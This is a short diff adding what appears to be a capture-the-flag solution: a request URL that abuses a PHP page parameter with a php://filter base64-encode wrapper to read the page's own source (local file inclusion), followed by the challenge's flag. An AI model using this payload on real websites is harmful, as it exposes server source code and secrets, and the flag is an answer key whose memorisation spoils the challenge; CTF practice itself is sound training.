@@ -1,0 +1,5 @@
+http://idsctf.mis.nsysu.edu.tw:9011/?p=php://filter/convert.base64-encode/resource=index
+
+===
+
+flag{L0cA1_fIl3_iNc1us!on_i5_bAD}
